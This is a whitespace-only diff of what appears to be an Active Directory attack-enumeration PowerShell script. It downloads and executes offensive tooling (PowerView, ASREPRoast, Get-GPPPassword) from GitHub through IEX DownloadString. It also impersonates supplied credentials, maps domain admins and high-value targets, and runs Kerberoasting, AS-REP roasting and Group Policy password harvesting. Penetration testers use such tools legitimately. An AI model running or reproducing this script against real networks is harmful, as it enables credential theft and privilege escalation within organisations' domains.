@@ -86,29 +86,29 @@ Param(
 	
 	[Parameter(Position = 1)]
 	[ValidateSet('Basic', 'Roasting', 'LargeEnv', 'Special', 'SYSVOL','Forest')]
-    [String]
-    $Mode = 'Basic',
+	[String]
+	$Mode = 'Basic',
 
 	[Parameter(Position = 2)]
-    [String]
-    $PowerViewURL = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1",
+	[String]
+	$PowerViewURL = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1",
 	
 	[Parameter(Position = 2)]
-    [String]
-    $ASREPRoastURL = "https://raw.githubusercontent.com/HarmJ0y/ASREPRoast/master/ASREPRoast.ps1",
+	[String]
+	$ASREPRoastURL = "https://raw.githubusercontent.com/HarmJ0y/ASREPRoast/master/ASREPRoast.ps1",
 	
 	[Parameter(Position = 2)]
-    [String]
-    $GetGPPPasswordURL = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-GPPPassword.ps1",
+	[String]
+	$GetGPPPasswordURL = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-GPPPassword.ps1",
 	
 	[Parameter(ParameterSetName = 'Credential')]
-    [Management.Automation.PSCredential]
-    [Management.Automation.CredentialAttribute()]
-    $Credential,
+	[Management.Automation.PSCredential]
+	[Management.Automation.CredentialAttribute()]
+	$Credential,
 	
 	[Parameter(Position = 3)]
-    [Switch]
-    $NoExcel
+	[Switch]
+	$NoExcel
 )
 
 #Supprese Errors and Warnings
@@ -127,22 +127,22 @@ try {
 	Write-Host "Downloading Powerview | " -NoNewLine
 	
 	if (Test-Path .\PowerView.ps1){
-	    Write-Host "[Skipping Download] PowerView.ps1 Present | " -NoNewLine
-        IEX $webclient.DownloadString('.\PowerView.ps1')
+		Write-Host "[Skipping Download] PowerView.ps1 Present | " -NoNewLine
+		IEX $webclient.DownloadString('.\PowerView.ps1')
 		Write-Host "Success" -ForegroundColor Green
 	}
 	else {	
-        Write-Host "$PowerViewURL | " -NoNewLine
+		Write-Host "$PowerViewURL | " -NoNewLine
 		IEX $webclient.DownloadString($PowerViewURL)
-        Write-Host "Success" -ForegroundColor Green
-    }
+		Write-Host "Success" -ForegroundColor Green
+	}
 }catch {Write-Host "Error" -ForegroundColor Red; Return}
 
 #Uses PowerView to create a new "runas /netonly" type logon and impersonate the token.
 if ($Credential -ne $null){
 	try{
 		$NetworkCredential = $Credential.GetNetworkCredential()
-        $Domain = $NetworkCredential.Domain
+		$Domain = $NetworkCredential.Domain
 		$UserName = $NetworkCredential.UserName
 		Write-Host "Impersonate user: $Domain\$Username | " -NoNewLine
 		Invoke-UserImpersonation -Credential $Credential | Out-Null
@@ -171,7 +171,7 @@ if ($Mode -eq 'Basic') {
 	PowEnum-DAs
 	PowEnum-EAs
 	PowEnum-BltAdmins
-    PowEnum-DCLocalAdmins
+	PowEnum-DCLocalAdmins
 	PowEnum-SchemaAdmins
 	PowEnum-AccountOperators
 	PowEnum-BackupOperators
@@ -191,17 +191,17 @@ if ($Mode -eq 'Basic') {
 	PowEnum-IPs
 	PowEnum-Subnets
 	PowEnum-DNSRecords
-    PowEnum-WinRM
-    PowEnum-FileServers
+	PowEnum-WinRM
+	PowEnum-FileServers
 	PowEnum-Computers
 	PowEnum-ExcelFile -SpreadsheetName Basic-HostsAndSessions
 }
 elseif ($Mode -eq 'Roasting') {
-    try {
+	try {
 		Write-Host "Downloading ASREPRoast | " -NoNewLine
-	    Write-Host "$ASREPRoastURL | " -NoNewLine
+		Write-Host "$ASREPRoastURL | " -NoNewLine
 		IEX $webclient.DownloadString($ASREPRoastURL)
-        Write-Host "Success" -ForegroundColor Green
+		Write-Host "Success" -ForegroundColor Green
 		PowEnum-ASREPRoast
 	}catch {Write-Host "Error" -ForegroundColor Red}
 	PowEnum-Kerberoast
@@ -213,7 +213,7 @@ elseif ($Mode -eq 'LargeEnv') {
 	PowEnum-DAs
 	PowEnum-EAs
 	PowEnum-BltAdmins
-    PowEnum-DCLocalAdmins
+	PowEnum-DCLocalAdmins
 	PowEnum-SchemaAdmins
 	PowEnum-AccountOperators
 	PowEnum-BackupOperators
@@ -230,8 +230,8 @@ elseif ($Mode -eq 'LargeEnv') {
 	PowEnum-DCs
 	PowEnum-Subnets
 	PowEnum-DNSRecords
-    PowEnum-WinRM
-    PowEnum-FileServers
+	PowEnum-WinRM
+	PowEnum-FileServers
 	PowEnum-ExcelFile -SpreadsheetName Large-HostsAndSessions
 }
 elseif ($Mode -eq 'Special') {
@@ -247,9 +247,9 @@ elseif ($Mode -eq 'Special') {
 elseif ($Mode -eq 'SYSVOL') {
 	try {
 		Write-Host "Downloading Get-GPPPassword | " -NoNewLine
-	    Write-Host "$GetGPPPasswordURL | " -NoNewLine
+		Write-Host "$GetGPPPasswordURL | " -NoNewLine
 		IEX $webclient.DownloadString($GetGPPPasswordURL)
-        Write-Host "Success" -ForegroundColor Green
+		Write-Host "Success" -ForegroundColor Green
 		PowEnum-GPPPassword
 	}catch {Write-Host "Error" -ForegroundColor Red}
 	PowEnum-SYSVOLFiles	
@@ -270,7 +270,7 @@ else {
 if ($Credential -ne $null){
 	try{
 		$NetworkCredential = $Credential.GetNetworkCredential()
-        $UserName = $NetworkCredential.UserName
+		$UserName = $NetworkCredential.UserName
 		Write-Host "Reverting Token from: $FQDN\$Username | " -NoNewLine
 		Invoke-RevertToSelf | Out-Null
 		Write-Host "Success" -ForegroundColor Green 
@@ -433,18 +433,18 @@ function PowEnum-HVTs {
 	try {
 		Write-Host "[ ]High Value Targets | " -NoNewLine
 		
-        #Grab all admins of the DCs
-        $LocalAdminsOnDCs = Get-DomainController -Domain $FQDN | Get-NetLocalGroupMember
-        
-        #Grab all "Domain" accounts and get the members
-        $temp = $LocalAdminsOnDCs | Where-Object {$_.IsGroup -eq $TRUE -and $_.IsDomain -eq $TRUE} | ForEach-Object {$_.MemberName.Substring($_.MemberName.IndexOf("\")+1)} | Sort-Object -Unique | Get-DomainGroupMember
-        
-        #Grab all non-Domain accounts and get the members
-        $temp = $LocalAdminsOnDCs | Where-Object {$_.IsGroup -eq $TRUE -and $_.IsDomain -eq $FALSE} | ForEach-Object {$_.MemberName.Substring($_.MemberName.IndexOf("\")+1)} | Sort-Object -Unique | Get-NetLocalGroupMember
-        
-        PowEnum-ExportAndCount -TypeEnum HVTs
+		#Grab all admins of the DCs
+		$LocalAdminsOnDCs = Get-DomainController -Domain $FQDN | Get-NetLocalGroupMember
+		
+		#Grab all "Domain" accounts and get the members
+		$temp = $LocalAdminsOnDCs | Where-Object {$_.IsGroup -eq $TRUE -and $_.IsDomain -eq $TRUE} | ForEach-Object {$_.MemberName.Substring($_.MemberName.IndexOf("\")+1)} | Sort-Object -Unique | Get-DomainGroupMember
+		
+		#Grab all non-Domain accounts and get the members
+		$temp = $LocalAdminsOnDCs | Where-Object {$_.IsGroup -eq $TRUE -and $_.IsDomain -eq $FALSE} | ForEach-Object {$_.MemberName.Substring($_.MemberName.IndexOf("\")+1)} | Sort-Object -Unique | Get-NetLocalGroupMember
+		
+		PowEnum-ExportAndCount -TypeEnum HVTs
 	
-    }catch {Write-Host "Error" -ForegroundColor Red}
+	}catch {Write-Host "Error" -ForegroundColor Red}
 }
 
 function PowEnum-NetSess {
